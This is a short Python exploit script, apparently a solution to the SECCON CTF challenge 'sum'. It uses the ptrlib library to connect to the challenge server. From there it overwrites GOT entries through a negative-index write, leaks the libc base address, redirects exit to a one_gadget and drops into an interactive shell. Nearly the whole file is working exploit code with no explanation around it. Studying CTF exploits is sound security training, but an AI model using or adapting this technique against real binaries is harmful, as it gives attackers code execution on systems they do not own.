from ptrlib import *
from time import sleep

def overwrite(target, value):
    sock.recvuntil("0\n")
    sock.sendline(str(-target))
    sock.sendline(str(2))
    sock.sendline(str(-1))
    sock.sendline(str(-1))
    sock.sendline(str(value))
    sock.sendline(str(target))
    return

elf = ELF("./sum")
libc = ELF("./libc.so")
#sock = Process("./sum")
sock = Socket("sum.chal.seccon.jp", 10001)
libc_one_gadget = 0x10a38c

# libc leak
overwrite(elf.got("exit"), elf.symbol("main"))
overwrite(elf.got("__stack_chk_fail"), elf.symbol("main"))
overwrite(elf.got("setvbuf"), elf.plt("puts"))
overwrite(0x601060 - 7, 0x7000000000000000)
overwrite(elf.got("exit"), elf.symbol("_start"))
libc_base = u64(sock.recvline()) - libc.symbol("_IO_2_1_stdout_") - 131
logger.info("libc base = " + hex(libc_base))

# one gadget!
overwrite(elf.got("exit"), libc_base + libc_one_gadget)

sock.interactive()
